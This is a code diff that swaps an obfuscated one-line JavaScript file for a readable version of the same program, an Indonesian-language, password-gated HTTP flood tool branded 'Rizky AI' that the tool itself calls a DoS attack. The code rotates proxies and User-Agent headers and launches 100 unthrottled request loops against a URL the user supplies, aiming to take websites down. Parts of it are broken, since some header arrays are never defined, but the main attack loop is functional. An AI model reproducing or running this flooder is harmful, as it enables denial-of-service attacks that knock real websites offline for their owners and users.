@@ -1,1 +1,202 @@
-const _0x42724f=_0x3997;(function(_0x22b87f,_0x219ff8){const _0x515043=_0x3997,_0x2b9b6b=_0x22b87f();while(!![]){try{const _0x3e79ef=-parseInt(_0x515043(0x182))/0x1+parseInt(_0x515043(0x17e))/0x2*(parseInt(_0x515043(0x169))/0x3)+-parseInt(_0x515043(0x19b))/0x4+parseInt(_0x515043(0x187))/0x5*(-parseInt(_0x515043(0x1a2))/0x6)+parseInt(_0x515043(0x1a8))/0x7*(-parseInt(_0x515043(0x176))/0x8)+-parseInt(_0x515043(0x186))/0x9*(parseInt(_0x515043(0x171))/0xa)+parseInt(_0x515043(0x192))/0xb;if(_0x3e79ef===_0x219ff8)break;else _0x2b9b6b['push'](_0x2b9b6b['shift']());}catch(_0x37fbc5){_0x2b9b6b['push'](_0x2b9b6b['shift']());}}}(_0x19c2,0x72b69));function _0x3997(_0x238d0e,_0x2febc4){const _0x19c2ce=_0x19c2();return _0x3997=function(_0x3997e9,_0x216f66){_0x3997e9=_0x3997e9-0x165;let _0x895ae1=_0x19c2ce[_0x3997e9];return _0x895ae1;},_0x3997(_0x238d0e,_0x2febc4);}const axios=require(_0x42724f(0x1a4)),fs=require('fs'),SocksProxyAgent=require(_0x42724f(0x1a1)),HttpsProxyAgent=require(_0x42724f(0x19c)),readline=require('readline'),proxyF=_0x42724f(0x193),uaLF=_0x42724f(0x18c),userAgents=_0x42724f(0x1aa),acceptHeader=[_0x42724f(0x165),_0x42724f(0x175),_0x42724f(0x165),_0x42724f(0x189),_0x42724f(0x191)];function readProxy(){const _0x2e526c=_0x42724f;try{const _0x37b04d=fs[_0x2e526c(0x16f)](proxyF,_0x2e526c(0x18e));return _0x37b04d['trim']()[_0x2e526c(0x16b)]('\x0a')[_0x2e526c(0x173)](_0x3405af=>_0x3405af[_0x2e526c(0x18f)]());}catch(_0x4531ec){return console['error'](_0x2e526c(0x188)+_0x4531ec),[];}}function readUA(){const _0x549c66=_0x42724f;try{const _0x47cfec=fs[_0x549c66(0x16f)](uaLF,_0x549c66(0x180))[_0x549c66(0x178)](/\r/g,'')[_0x549c66(0x16b)]('\x0a');return _0x47cfec['map'](_0x56d0a2=>_0x56d0a2['trim']());}catch(_0x4c71c1){return console['error'](_0x549c66(0x197)+_0x4c71c1),[];}}function sanitizeUA(_0x3786e9){const _0x1255fa=_0x42724f;return _0x3786e9[_0x1255fa(0x178)](/[^\x20-\x7E]/g,'');}function randElement(_0x28e672){const _0x1b0ff0=_0x42724f;return _0x28e672[Math[_0x1b0ff0(0x172)](Math['random']()*_0x28e672[_0x1b0ff0(0x196)])];}const delay=0x0;function sendReq(_0x28dd92,_0x2d67c4,_0x319090){const _0x78eb76=_0x42724f,_0x13f14e=sanitizeUA(randElement(userAgents)),_0x2706c1={'User-Agent':_0x13f14e,'Accept':randElement(acceptHeader),'Accept-Encoding':randElement(encodingHeader),'Accept-Language':randElement(langHeader),'Referer':randElement(refers),'Cache-Control':randElement(cplist),'DNT':'1','Connection':_0x78eb76(0x17d),'Upgrade-Insecure-Requests':'1','TE':_0x78eb76(0x16a)};axios['get'](_0x28dd92,{'httpAgent':_0x2d67c4,'headers':_0x2706c1,'timeout':0x0})[_0x78eb76(0x167)](_0x1e3198=>{setTimeout(()=>sendReq(_0x28dd92,_0x2d67c4,_0x319090),0x0);})['catch'](_0x3818a3=>{const _0xd134b1=_0x78eb76;if(_0x3818a3['response']&&_0x3818a3[_0xd134b1(0x16c)]['status']===0x1f7)console[_0xd134b1(0x17b)](_0xd134b1(0x1a6));else _0x3818a3[_0xd134b1(0x16c)]&&_0x3818a3[_0xd134b1(0x16c)]['status']===0x1f6?console[_0xd134b1(0x17b)](_0xd134b1(0x179)):console['log']('Error:\x20'+_0x3818a3[_0xd134b1(0x199)]);setTimeout(()=>sendReq(_0x28dd92,_0x2d67c4,_0x319090),0x0);});}function sendReqs(_0x331f5d){const _0x1bb5cf=_0x42724f,_0x2df0b9=readProxy(),_0x5b1e1c=readUA();if(_0x2df0b9[_0x1bb5cf(0x196)]>0x0){const _0xde48c1=randElement(_0x2df0b9),_0x1d1ef3=_0xde48c1[_0x1bb5cf(0x16b)](':'),_0x26bdf0=_0x1d1ef3[0x0][_0x1bb5cf(0x18d)](_0x1bb5cf(0x17f))?_0x1bb5cf(0x195):_0x1bb5cf(0x166),_0x2fce6f=_0x26bdf0+'://'+_0x1d1ef3[0x0]+':'+_0x1d1ef3[0x1],_0x486942=_0x26bdf0===_0x1bb5cf(0x195)?new SocksProxyAgent(_0x2fce6f):new HttpsProxyAgent(_0x2fce6f);sendReq(_0x331f5d,_0x486942,randElement(_0x5b1e1c));}else sendReq(_0x331f5d,null,randElement(_0x5b1e1c));}const rl=readline[_0x42724f(0x1a5)]({'input':process[_0x42724f(0x183)],'output':process[_0x42724f(0x170)]});function askPassword(){const _0x82930f=_0x42724f;rl[_0x82930f(0x17c)](_0x82930f(0x16e),_0x2c5e35=>{const _0x522a7f=_0x82930f;_0x2c5e35!==_0x522a7f(0x19f)?(console[_0x522a7f(0x17b)](_0x522a7f(0x194)),askPassword()):showMenu();});}function showMenu(){const _0xbf981c=_0x42724f;console[_0xbf981c(0x17b)](_0xbf981c(0x168)),askForUrl();}function askForUrl(){const _0x10b90b=_0x42724f;console['log'](_0x10b90b(0x1a0)),console[_0x10b90b(0x17b)](_0x10b90b(0x190)),console[_0x10b90b(0x17b)](_0x10b90b(0x19a)),rl[_0x10b90b(0x17c)](_0x10b90b(0x1a9),_0x5e6832=>{const _0x3df79f=_0x10b90b;if(!_0x5e6832[_0x3df79f(0x18d)](_0x3df79f(0x1a3))&&!_0x5e6832[_0x3df79f(0x18d)](_0x3df79f(0x18a)))console[_0x3df79f(0x17b)]('\x1b[38;5;196m╭━⛔\x20𝗘𝗥𝗥𝗢𝗥\x20━╮'),console['log']('┃\x20URL\x20tidak\x20valid!'),console[_0x3df79f(0x17b)](_0x3df79f(0x19d)),console['log'](_0x3df79f(0x1a7)),askForUrl();else{console['log'](_0x3df79f(0x18b)),console[_0x3df79f(0x17b)](_0x3df79f(0x177)),console['log']('┃\x20⚙️\x20\x1b[38;5;190m𝗠𝗘𝗡𝗬𝗘𝗥𝗔𝗡𝗚\x20𝗧𝗔𝗥𝗚𝗘𝗧\x20𝗗𝗘𝗡𝗚𝗔𝗡\x20𝗗𝗢𝗦\x20⚙️\x1b[38;5;46m'),console[_0x3df79f(0x17b)](_0x3df79f(0x19e)),console[_0x3df79f(0x17b)](_0x3df79f(0x17a)),console[_0x3df79f(0x17b)](_0x3df79f(0x198)),console[_0x3df79f(0x17b)]('┃⚠️\x20\x1b[38;5;196m𝗘𝗙𝗘𝗞\x20\x20\x20\x20\x20:\x20\x1b[0mʙɪꜱᴀ\x20ʙɪᴋɪɴ\x20ᴡᴇʙꜱɪᴛᴇ\x20ᴅᴏᴡɴ\x20ᴘᴀᴋᴀɪʟᴀʜ\x20ᴅᴇɴɢᴀɴ\x20ʙɪᴊᴀᴋ'),console[_0x3df79f(0x17b)](_0x3df79f(0x181)),console['log'](_0x3df79f(0x185));let _0x54bf76=!![];const _0x17754e=0x8e679c2f5e450000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,_0x57a553=0x3a5437c8091f2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,_0x39a9be=()=>{const _0x34909c=_0x3df79f;try{if(!_0x54bf76)return;const _0x348488=randElement(userAgents),_0x4dcf58={'User-Agent':_0x348488};axios[_0x34909c(0x184)](_0x5e6832,{'headers':_0x4dcf58})['then'](_0x30238e=>{const _0x10bd4d=_0x34909c;if(_0x30238e[_0x10bd4d(0x174)]===0x1f7){}})[_0x34909c(0x16d)](_0x189ef6=>{const _0x2eb9e8=_0x34909c;if(_0x189ef6['response']&&_0x189ef6[_0x2eb9e8(0x16c)][_0x2eb9e8(0x174)]===0x1f6){}}),setTimeout(_0x39a9be,0x3e8/_0x57a553);}catch(_0x2201b5){console[_0x34909c(0x17b)]('Error:\x20'+_0x2201b5['message']),setTimeout(_0x39a9be,0x3e8/_0x57a553);}},_0x133f15=0x64;for(let _0x4fbf04=0x0;_0x4fbf04<_0x133f15;_0x4fbf04++){_0x39a9be();}setTimeout(()=>{const _0x70e53f=_0x3df79f;_0x54bf76=![],console[_0x70e53f(0x17b)]('Max\x20requests\x20reached'),askForUrl();},_0x17754e/_0x57a553*0x3e8);}});}function _0x19c2(){const _0x4a4645=['then','\x0a╭━𓊈\x20𝐑𝐈𝐙𝐊𝐘\x20𝐀𝐈\x20𝐓𝐎𝐎𝐋𝐒\x20𓊉━═╣\x0a║𝙱𝙾𝚃\x20𝙽𝙰𝙼𝙴\x20:\x20⚙️\x20𝐑𝐢𝐳𝐤𝐲-𝐀𝐢\x20⚙️\x0a┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽\x20\x20:\x202.2\x0a║𝙰𝚄𝚃𝙷𝙾𝚁\x20\x20\x20:\x20𝐑𝐢𝐳𝐤𝐲\x20𝐜𝐲𝐛𝐞𝐫\x0a╰━━━━━━━━━━━━━━━━━━━━━━━═╣\x0a\x0a┏━━『\x20⚠️\x20𝗣𝗘𝗥𝗜𝗡𝗚𝗔𝗧𝗔𝗡\x20』\x0a╿☒\x20⧽\x20𝗝𝗔𝗡𝗚𝗔𝗡\x20𝗦𝗘𝗥𝗔𝗡𝗚\x20𝗦𝗜𝗧𝗨𝗦\x20𝗣𝗘𝗠𝗘𝗥𝗜𝗡𝗧𝗔𝗛\x0a╽☒\x20⧽\x20𝗝𝗔𝗡𝗚𝗔𝗡\x20𝗦𝗘𝗥𝗔𝗡𝗚\x20𝗦𝗜𝗧𝗨𝗦\x20𝗣𝗘𝗡𝗗𝗜𝗗𝗜𝗞𝗔𝗡\x0a┗━━━━━━━━━━━━━━━━━━━━━━━━\x0a','3YBIYsN','Trailers','split','response','catch','\x1b[38;5;208m[🔒]\x20Masukkan\x20Password:\x20\x1b[0m','readFileSync','stdout','10UznpPR','floor','map','status','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','41296OXKNhe','╭━𓊈\x20\x1b[38;5;82m𝗥𝗜𝗭𝗞𝗬\x20𝗔𝗜\x1b[38;5;46m\x20-\x20\x1b[38;5;82m𝗗𝗢𝗦\x20𝗠𝗢𝗗𝗘\x1b[38;5;46m\x20𓊉━═╣','replace','Error:\x20Request\x20failed\x20with\x20status\x20code\x20502','┃📡\x20\x1b[38;5;220m𝗣𝗥𝗢𝗚𝗥𝗘𝗦\x20:\x20\x1b[0mꜱᴇᴅᴀɴɢ\x20ᴍᴇɴɢɪʀɪᴍ\x20ʀᴇQᴜᴇꜱᴛ\x20ᴋᴇ\x20ᴛᴀʀɢᴇᴛ','log','question','keep-alive','1802026uDdXZX','socks','utf-8','╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣','702693PRfSrf','stdin','get','\x1b[0m','1618011omuOdt','2840hAewHt','Failed\x20to\x20read\x20proxy\x20list:\x20','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','https://','\x1b[38;5;46m','ua.txt','startsWith','utf8','trim','\x1b[38;5;40m┃📥\x20ᴍᴀꜱᴜᴋᴋᴀɴ\x20ᴜʀʟ\x20ᴛᴀʀɢᴇᴛ\x20ᴜɴᴛᴜᴋ\x20ᴅɪꜱᴇʀᴀɴɢ\x1b[0m','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','21847386BwpZig','proxy.txt','\x1b[38;5;196m⛔\x20Password\x20salah!\x20Akses\x20ditolak.\x1b[0m\x0a','socks5','length','Failed\x20to\x20read\x20user\x20agent\x20list:\x20','┃🕒\x20\x1b[38;5;190m𝗣𝗘𝗦𝗔𝗡\x20\x20\x20:\x20\x1b[0mᴊᴀɴɢᴀɴ\x20ꜱᴇʀᴀɴɢ\x20ᴡᴇʙꜱɪᴛᴇ\x20ᴛᴇʀʟᴀʟᴜ\x20ʟᴀᴍᴀ','message','\x1b[38;5;40m╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣\x1b[0m','718752GXlyVk','https-proxy-agent','┃\x20Harus\x20diawali\x20dengan\x20\x22http://\x22\x20atau\x20\x22https://\x22','┃═════════════════════════════════','Rizky-Ai','\x1b[38;5;40m╭━𓊈\x20𝗥𝗜𝗭𝗞𝗬\x20𝗔𝗜\x20-\x20𝗨𝗥𝗟\x20𝗜𝗡𝗣𝗨𝗧\x20𓊉━═╣\x1b[0m','socks-proxy-agent','6408rFthqC','http://','axios','createInterface','wkwk','╰━━━━━━━━━━━━━╯\x1b[0m\x0a','1015ToYeTf','\x1b[38;5;82m[🌐]\x20URL\x20Target:\x1b[0m','wx.txt','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3','http'];_0x19c2=function(){return _0x4a4645;};return _0x19c2();}askPassword();
+const axios = require('axios');
+const fs = require('fs');
+const SocksProxyAgent = require('socks-proxy-agent');
+const HttpsProxyAgent = require('https-proxy-agent');
+const readline = require('readline');
+
+const proxyF = "proxy.txt";
+const uaLF = "ua.txt";
+const userAgents = "wx.txt";
+
+const acceptHeader = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+];
+
+function readProxy() {
+    try {
+        const data = fs.readFileSync(proxyF, "utf8");
+        return data.trim().split("\n").map((line) => line.trim());
+    } catch (error) {
+        console.error(`Failed to read proxy list: ${error}`);
+        return [];
+    }
+}
+
+function readUA() {
+    try {
+        const data = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n");
+        return data.map((line) => line.trim());
+    } catch (error) {
+        console.error(`Failed to read user agent list: ${error}`);
+        return [];
+    }
+}
+
+function sanitizeUA(userAgent) {
+    return userAgent.replace(/[^\x20-\x7E]/g, "");
+}
+
+function randElement(arr) {
+    return arr[Math.floor(Math.random() * arr.length)];
+}
+
+const delay = 0;
+
+function sendReq(target, agent, userAgent) {
+    const sanitizedUserAgent = sanitizeUA(randElement(userAgents));
+    const headers = {
+        "User-Agent": sanitizedUserAgent,
+        Accept: randElement(acceptHeader),
+        "Accept-Encoding": randElement(encodingHeader),
+        "Accept-Language": randElement(langHeader),
+        Referer: randElement(refers),
+        "Cache-Control": randElement(cplist),
+        DNT: "1",
+        Connection: "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        TE: "Trailers",
+    };
+
+    axios
+        .get(target, { httpAgent: agent, headers: headers, timeout: 0 })
+        .then((_) => {
+            setTimeout(() => sendReq(target, agent, userAgent), 0);
+        })
+        .catch((error) => {
+            if (error.response && error.response.status === 503) {
+                console.log("wkwk");
+            } else if (error.response && error.response.status === 502) {
+                console.log("Error: Request failed with status code 502");
+            } else {
+                console.log("Error: " + error.message);
+            }
+            setTimeout(() => sendReq(target, agent, userAgent), 0);
+        });
+}
+
+function sendReqs(targetUrl) {
+    const proxies = readProxy();
+    const userAgentsList = readUA();
+
+    if (proxies.length > 0) {
+        const proxy = randElement(proxies);
+        const proxyParts = proxy.split(":");
+        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
+        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+        const agent = proxyProtocol === "socks5"
+            ? new SocksProxyAgent(proxyUrl)
+            : new HttpsProxyAgent(proxyUrl);
+
+        sendReq(targetUrl, agent, randElement(userAgentsList));
+    } else {
+        sendReq(targetUrl, null, randElement(userAgentsList));
+    }
+}
+
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
+
+// ✅ Tambahan: Autentikasi Password
+function askPassword() {
+    rl.question('\x1b[38;5;208m[🔒] Masukkan Password: \x1b[0m', (password) => {
+        if (password !== 'Rizky-Ai') {
+            console.log('\x1b[38;5;196m⛔ Password salah! Akses ditolak.\x1b[0m\n');
+            askPassword();
+        } else {
+            showMenu();
+        }
+    });
+}
+
+function showMenu() {
+    console.log(`
+╭━𓊈 𝐑𝐈𝐙𝐊𝐘 𝐀𝐈 𝐓𝐎𝐎𝐋𝐒 𓊉━═╣
+║𝙱𝙾𝚃 𝙽𝙰𝙼𝙴 : ⚙️ 𝐑𝐢𝐳𝐤𝐲-𝐀𝐢 ⚙️
+┃𝚅𝙴𝚁𝚂𝙸𝙾𝙽  : 2.2
+║𝙰𝚄𝚃𝙷𝙾𝚁   : 𝐑𝐢𝐳𝐤𝐲 𝐜𝐲𝐛𝐞𝐫
+╰━━━━━━━━━━━━━━━━━━━━━━━═╣
+
+┏━━『 ⚠️ 𝗣𝗘𝗥𝗜𝗡𝗚𝗔𝗧𝗔𝗡 』
+╿☒ ⧽ 𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗘𝗥𝗔𝗡𝗚 𝗦𝗜𝗧𝗨𝗦 𝗣𝗘𝗠𝗘𝗥𝗜𝗡𝗧𝗔𝗛
+╽☒ ⧽ 𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗘𝗥𝗔𝗡𝗚 𝗦𝗜𝗧𝗨𝗦 𝗣𝗘𝗡𝗗𝗜𝗗𝗜𝗞𝗔𝗡
+┗━━━━━━━━━━━━━━━━━━━━━━━━
+`);
+    askForUrl();
+}
+
+function askForUrl() {
+    console.log('\x1b[38;5;40m╭━𓊈 𝗥𝗜𝗭𝗞𝗬 𝗔𝗜 - 𝗨𝗥𝗟 𝗜𝗡𝗣𝗨𝗧 𓊉━═╣\x1b[0m');
+    console.log('\x1b[38;5;40m┃📥 ᴍᴀꜱᴜᴋᴋᴀɴ ᴜʀʟ ᴛᴀʀɢᴇᴛ ᴜɴᴛᴜᴋ ᴅɪꜱᴇʀᴀɴɢ\x1b[0m');
+    console.log('\x1b[38;5;40m╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣\x1b[0m');
+
+    rl.question('\x1b[38;5;82m[🌐] URL Target:\x1b[0m', (url) => {
+        if (!url.startsWith("http://") && !url.startsWith("https://")) {
+            console.log('\x1b[38;5;196m╭━⛔ 𝗘𝗥𝗥𝗢𝗥 ━╮');
+            console.log('┃ URL tidak valid!');
+            console.log('┃ Harus diawali dengan "http://" atau "https://"');
+            console.log('╰━━━━━━━━━━━━━╯\x1b[0m\n');
+            askForUrl(); // tanya ulang
+        } else {
+            console.log("\x1b[38;5;46m");
+            console.log("╭━𓊈 \x1b[38;5;82m𝗥𝗜𝗭𝗞𝗬 𝗔𝗜\x1b[38;5;46m - \x1b[38;5;82m𝗗𝗢𝗦 𝗠𝗢𝗗𝗘\x1b[38;5;46m 𓊉━═╣");
+            console.log("┃ ⚙️ \x1b[38;5;190m𝗠𝗘𝗡𝗬𝗘𝗥𝗔𝗡𝗚 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗘𝗡𝗚𝗔𝗡 𝗗𝗢𝗦 ⚙️\x1b[38;5;46m");
+            console.log("┃═════════════════════════════════");
+            console.log("┃📡 \x1b[38;5;220m𝗣𝗥𝗢𝗚𝗥𝗘𝗦 : \x1b[0mꜱᴇᴅᴀɴɢ ᴍᴇɴɢɪʀɪᴍ ʀᴇQᴜᴇꜱᴛ ᴋᴇ ᴛᴀʀɢᴇᴛ");
+            console.log("┃🕒 \x1b[38;5;190m𝗣𝗘𝗦𝗔𝗡   : \x1b[0mᴊᴀɴɢᴀɴ ꜱᴇʀᴀɴɢ ᴡᴇʙꜱɪᴛᴇ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ");
+            console.log("┃⚠️ \x1b[38;5;196m 𝗘𝗙𝗘𝗞    : \x1b[0mʙɪꜱᴀ ʙɪᴋɪɴ ᴡᴇʙꜱɪᴛᴇ ᴅᴏᴡɴ ᴘᴀᴋᴀɪʟᴀʜ ᴅᴇɴɢᴀɴ ʙɪᴊᴀᴋ");
+            console.log("╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣");
+            console.log("\x1b[0m");
+
+            let continueAttack = true;
+            const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
+
+            const requestsPerSecond = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
+
+            const attack = () => {
+                try {
+                    if (!continueAttack) return;
+
+                    const userAgent = randElement(userAgents);
+                    const headers = {
+                        'User-Agent': userAgent
+                    };
+
+                    axios.get(url, { headers })
+                        .then((response) => {
+                            if (response.status === 503) {
+                            }
+                        })
+                        .catch((error) => {
+                            if (error.response && error.response.status === 502) {
+                            }
+                        });
+
+                    setTimeout(attack, 1000 / requestsPerSecond);
+                } catch (error) {
+                    console.log("Error: " + error.message);
+                    setTimeout(attack, 1000 / requestsPerSecond);
+                }
+            };
+
+            const numThreads = 100;
+            for (let i = 0; i < numThreads; i++) {
+                attack();
+            }
+
+            setTimeout(() => {
+                continueAttack = false;
+                console.log('Max requests reached');
+                askForUrl();
+            }, maxRequests / requestsPerSecond * 1000);
+        }
+    });
+}
+
+// 🔐 Mulai dengan minta password
+askPassword();
